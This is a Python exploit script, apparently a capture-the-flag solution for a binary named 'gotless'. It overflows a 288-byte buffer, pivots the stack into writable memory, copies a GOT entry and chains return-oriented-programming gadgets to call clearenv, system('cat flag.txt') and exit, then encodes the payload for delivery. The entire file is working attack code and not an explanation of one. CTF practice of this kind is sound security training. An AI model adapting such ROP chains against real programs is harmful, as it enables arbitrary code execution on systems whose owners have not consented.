#!/usr/bin/env python3
import sys
from rop_stuff import *

# address of the GOT entry in gotless and the addr we will be copying it to.
addr_GOT_original = 0x403ff0
addr_GOT_copy     = 0x404000

# address of "cat flag.txt".
addr_cat_flag_str = 0x40409a

# the new stack is going to be 192 bytes long, so the new stack will start at
# 0x405000 - 248 to allow for as much room as possible for the frames of the
# libc functions we are going to call.
# we will eventually set the new rsp to new_stack_base - 8 to account for the
# `pop r13` following `pop rsp`.
new_stack_base = 0x405000 - 248

# setup libccaller (which keeps track of current value of the GOT entry copy)
libc_caller = LibcCaller(addr_GOT_copy)

# here I build the "actual" rop-chain, which does all of the actual work. this
# will be written to the new stack location by the initial rop-chain.
new_stack_contents = (

    # copy relocated addr of __libc_start_main to a writable location.
    qword_copy_chain(addr_GOT_original, addr_GOT_copy,
                     current_rsp = new_stack_base) +

    # call clearenv() to avoid execve crashing due to the ROP-chain having
    # overwritten the global `environ` variable; then carry on with the program.
    libc_caller.call_libc_chain("clearenv") +
    libc_caller.call_libc_chain("system", rdi = addr_cat_flag_str) +
    libc_caller.call_libc_chain("exit",   rdi = 66)
)


# build the initial rop-chain, which is simply going to migrate the "actual"
# rop-chain to the new stack.
payload = (
    rand_bytes(288) + # 288 bytes of garbage to overflow the `hash` buffer.

    # write the new stack to writable memory.
    arbitrary_write_chain(new_stack_base, new_stack_contents) +

    # set rbx = address that will eventually hold our copy of the GOT entry.
    set_rbx_gadget(addr_GOT_copy) +

    # update stack pointer (we start at -8 to account for `pop r13`).
    set_rsp_gadget(new_stack_base - 8)
)

encoded_payload = b"".join(
    [bytes([(b & 0x0F) + 0x40, ((b & 0xF0) >> 4) + 0x40]) for b in payload])

sys.stdout.buffer.write(encoded_payload)
